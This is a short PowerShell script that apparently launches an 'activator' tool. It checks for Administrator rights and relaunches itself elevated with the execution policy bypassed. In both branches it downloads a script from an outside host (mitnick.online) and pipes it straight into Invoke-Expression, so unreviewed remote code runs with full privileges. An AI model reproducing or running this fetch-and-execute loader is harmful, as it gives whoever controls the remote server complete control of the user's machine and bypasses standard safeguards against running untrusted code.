if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://mitnick.online/zap/activator.ps1 | iex`""
    exit
}
irm https://mitnick.online/zap/activator.ps1 | iex